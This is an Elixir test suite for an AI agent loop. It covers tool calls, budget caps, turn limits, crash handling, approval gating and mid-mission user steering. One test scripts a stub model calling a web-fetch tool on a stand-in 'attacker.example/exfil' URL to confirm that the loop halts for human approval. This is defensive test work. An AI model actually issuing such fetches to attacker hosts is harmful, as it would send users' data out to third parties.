defmodule Sprat.Agent.LoopTest.CrashingTool do
  @moduledoc "A tool that raises, for exercising `Sprat.Agent.Loop`'s crash safety net — a real tool (`record_claim`) once did exactly this via a hard `{:ok, _} = ...` match on a store call that failed."
  @behaviour Sprat.Agent.Tool

  @impl true
  def name, do: "crashing_tool"

  @impl true
  def spec do
    %{
      "type" => "function",
      "function" => %{
        "name" => "crashing_tool",
        "description" => "always raises",
        "parameters" => %{"type" => "object", "properties" => %{}}
      }
    }
  end

  @impl true
  def call(_args, _context), do: raise("boom")
end

defmodule Sprat.Agent.LoopTest do
  use Sprat.StoreCase, async: true

  alias Sprat.Agent.Loop
  alias Sprat.Agent.Tools.Calculate
  alias Sprat.Agent.LoopTest.CrashingTool
  alias Sprat.Store.{Events, Usage}
  alias Sprat.StubModel

  defp stub_catalog(model_id) do
    %Sprat.Model.Pricing{
      version: 1,
      provider: "stub",
      effective_date: "2026-01-01",
      source: "test fixture",
      models: [
        %{
          id: model_id,
          supports_tools: true,
          supports_streaming: true,
          context_window: 100_000,
          price: %{
            input: Decimal.new("1.00"),
            cached_input: Decimal.new("0.50"),
            output: Decimal.new("2.00")
          }
        }
      ]
    }
  end

  setup %{store: store} do
    {:ok, budget} =
      Sprat.Budget.start_link(name: :"budget_#{System.unique_integer([:positive])}", store: store)

    {session, mission, task} = fixture_chain(store)
    Sprat.Budget.set_cap(budget, mission.id, Decimal.new("5.00"))
    model_id = "stub-#{System.unique_integer([:positive])}"

    base_opts = %{
      model_mod: StubModel,
      model_id: model_id,
      role_prompt: "You are a helpful analyst.",
      context_package: "What is 2+2?",
      tools: [Calculate],
      tool_context: %{},
      store: store,
      budget: budget,
      session_id: session.id,
      mission_id: mission.id,
      task_id: task.id,
      attempt: 1,
      agent_id: "analyst_1",
      catalog: stub_catalog(model_id)
    }

    %{
      opts: base_opts,
      store: store,
      session: session,
      mission: mission,
      task: task,
      model_id: model_id
    }
  end

  test "runs a tool round trip to a final answer, recording usage and events for every turn", %{
    opts: opts,
    store: store,
    session: session,
    mission: mission,
    task: task,
    model_id: model_id
  } do
    {:ok, _} =
      StubModel.start_script(model_id, [
        %{
          content: nil,
          tool_calls: [%{id: "call_1", name: "calculate", arguments: %{"expression" => "2+2"}}],
          stop_reason: :tool_calls,
          usage: %{"prompt_tokens" => 20, "completion_tokens" => 5},
          raw: %{}
        },
        %{
          content: "The answer is 4.",
          tool_calls: [],
          stop_reason: :stop,
          usage: %{"prompt_tokens" => 30, "completion_tokens" => 8},
          raw: %{}
        }
      ])

    assert {:ok, %{content: "The answer is 4.", stop_reason: :stop}} = Loop.run(opts)

    usage_records = Usage.by_mission(store, mission.id)
    assert length(usage_records) == 2
    assert Enum.all?(usage_records, &(&1.coverage == "reported"))

    events = Events.by_session(store, session.id)
    types = Enum.map(events, & &1.type)

    assert Enum.count(types, &(&1 == "model.request")) == 2
    assert Enum.count(types, &(&1 == "model.response")) == 2
    assert "tool.requested" in types
    assert "tool.completed" in types
    assert Enum.all?(events, &(&1.task_id == task.id))
    assert Enum.all?(events, &(&1.mission_id == mission.id))
  end

  test "a tool call needing approval halts the loop and surfaces the request", %{
    opts: opts,
    model_id: model_id
  } do
    {:ok, _} =
      StubModel.start_script(model_id, [
        %{
          content: nil,
          tool_calls: [
            %{
              id: "call_1",
              name: "web_fetch",
              arguments: %{"url" => "https://attacker.example/exfil"}
            }
          ],
          stop_reason: :tool_calls,
          usage: %{},
          raw: %{}
        }
      ])

    opts = %{opts | tools: [Sprat.Agent.Tools.WebFetch], tool_context: %{}}
    assert {:needs_approval, request, _state} = Loop.run(opts)
    assert request.url == "https://attacker.example/exfil"
    assert request.tool == "web_fetch"
  end

  describe "resume/3" do
    setup %{opts: opts, model_id: model_id} do
      {:ok, _} =
        StubModel.start_script(model_id, [
          %{
            content: nil,
            tool_calls: [
              %{
                id: "call_1",
                name: "web_fetch",
                arguments: %{"url" => "https://model-composed.example/x"}
              }
            ],
            stop_reason: :tool_calls,
            usage: %{},
            raw: %{}
          },
          %{content: "Summarised.", tool_calls: [], stop_reason: :stop, usage: %{}, raw: %{}}
        ])

      opts = %{opts | tools: [Sprat.Agent.Tools.WebFetch], tool_context: %{}}
      {:ok, resume} = needs_approval(opts)
      %{opts: opts, resume: resume}
    end

    defp needs_approval(opts) do
      {:needs_approval, _request, resume} = Loop.run(opts)
      {:ok, resume}
    end

    test "approved: retries the tool with the patched context, then finishes the loop", %{
      resume: resume
    } do
      decision = {:approved, %{auto_fetch_urls: MapSet.new(["https://model-composed.example/x"])}}
      assert {:ok, %{content: "Summarised."}} = Loop.resume(resume, decision)
    end

    test "denied: the model sees a denial and the loop still finishes, recording a failed tool.completed",
         %{store: store, session: session, resume: resume} do
      assert {:ok, %{content: "Summarised."}} = Loop.resume(resume, :denied)

      events = Events.by_session(store, session.id)
      assert Enum.any?(events, &(&1.type == "tool.completed" and &1.payload =~ "\"ok?\":false"))
    end
  end

  test "price-unknown model refuses to run rather than skip the budget check", %{opts: opts} do
    opts = Map.delete(opts, :catalog)
    opts = %{opts | model_id: "totally-unlisted-model-#{System.unique_integer([:positive])}"}

    {:ok, _} =
      StubModel.start_script(opts.model_id, [
        %{content: "hi", tool_calls: [], stop_reason: :stop, usage: %{}, raw: %{}}
      ])

    assert {:error, :price_unknown} = Loop.run(opts)
  end

  test "a cap too small for even one call is refused before any model call", %{
    opts: opts,
    mission: mission
  } do
    Sprat.Budget.set_cap(opts.budget, mission.id, Decimal.new("0.0000001"))
    assert {:error, {:would_exceed_cap, _}} = Loop.run(opts)
  end

  test "max_turns_exceeded when the model keeps calling tools forever", %{
    opts: opts,
    model_id: model_id
  } do
    tool_call_forever = %{
      content: nil,
      tool_calls: [%{id: "call_x", name: "calculate", arguments: %{"expression" => "1+1"}}],
      stop_reason: :tool_calls,
      usage: %{},
      raw: %{}
    }

    {:ok, _} = StubModel.start_script(model_id, List.duplicate(tool_call_forever, 5))
    opts = Map.put(opts, :max_turns, 3)
    assert {:error, :max_turns_exceeded} = Loop.run(opts)
  end

  test "a tool implementation raising does not crash the loop — the model sees a tool error instead",
       %{opts: opts, model_id: model_id} do
    {:ok, _} =
      StubModel.start_script(model_id, [
        %{
          content: nil,
          tool_calls: [%{id: "call_1", name: "crashing_tool", arguments: %{}}],
          stop_reason: :tool_calls,
          usage: %{},
          raw: %{}
        },
        %{content: "recovered", tool_calls: [], stop_reason: :stop, usage: %{}, raw: %{}}
      ])

    opts = %{opts | tools: [CrashingTool]}
    assert {:ok, %{content: "recovered"}} = Loop.run(opts)
  end

  # -- mid-mission steering (docs/spec-v1.md §10) --------------------------

  describe "steering_fetch" do
    test "delivered steering reaches the very next turn's request, not the current one", %{
      opts: opts,
      model_id: model_id
    } do
      {:ok, _} =
        StubModel.start_script(model_id, [
          %{
            content: nil,
            tool_calls: [%{id: "call_1", name: "calculate", arguments: %{"expression" => "1+1"}}],
            stop_reason: :tool_calls,
            usage: %{},
            raw: %{}
          },
          %{content: "done", tool_calls: [], stop_reason: :stop, usage: %{}, raw: %{}}
        ])

      # Nothing queued for turn 1; "UK only" becomes queued only after it —
      # the fetch itself marks it delivered, so it must not appear before
      # turn 2's request is built.
      {:ok, agent} = Agent.start_link(fn -> [[], ["UK only"]] end)
      fetch = fn -> Agent.get_and_update(agent, fn [next | rest] -> {next, rest} end) end
      opts = Map.put(opts, :steering_fetch, fetch)

      assert {:ok, %{content: "done"}} = Loop.run(opts)

      request = StubModel.last_request(model_id)
      contents = Enum.map(request.messages, &Map.get(&1, "content"))

      # Turn 1's request (first call) never saw it — reconstructed from
      # the fact that the final (turn 2) request has exactly one steering
      # note appended, right after the tool result, not duplicated.
      steering_notes = Enum.count(contents, &(is_binary(&1) and &1 =~ "USER STEERING"))
      assert steering_notes == 1
      assert Enum.any?(contents, &(is_binary(&1) and &1 =~ "UK only"))
    end

    test "several messages queued before a boundary deliver together, in order", %{
      opts: opts,
      model_id: model_id
    } do
      {:ok, _} =
        StubModel.start_script(model_id, [
          %{content: "done", tool_calls: [], stop_reason: :stop, usage: %{}, raw: %{}}
        ])

      opts = Map.put(opts, :steering_fetch, fn -> ["UK only", "focus on independent gyms"] end)

      assert {:ok, %{content: "done"}} = Loop.run(opts)

      request = StubModel.last_request(model_id)

      [steering_content] =
        request.messages
        |> Enum.map(&Map.get(&1, "content"))
        |> Enum.filter(&(is_binary(&1) and &1 =~ "USER STEERING"))

      assert String.contains?(steering_content, "UK only")
      assert String.contains?(steering_content, "focus on independent gyms")

      uk_index = :binary.match(steering_content, "UK only") |> elem(0)
      gyms_index = :binary.match(steering_content, "focus on independent gyms") |> elem(0)
      assert uk_index < gyms_index
    end

    test "no steering_fetch opt is a no-op — existing callers unaffected", %{
      opts: opts,
      model_id: model_id
    } do
      {:ok, _} =
        StubModel.start_script(model_id, [
          %{content: "done", tool_calls: [], stop_reason: :stop, usage: %{}, raw: %{}}
        ])

      refute Map.has_key?(opts, :steering_fetch)
      assert {:ok, %{content: "done"}} = Loop.run(opts)
    end
  end
end
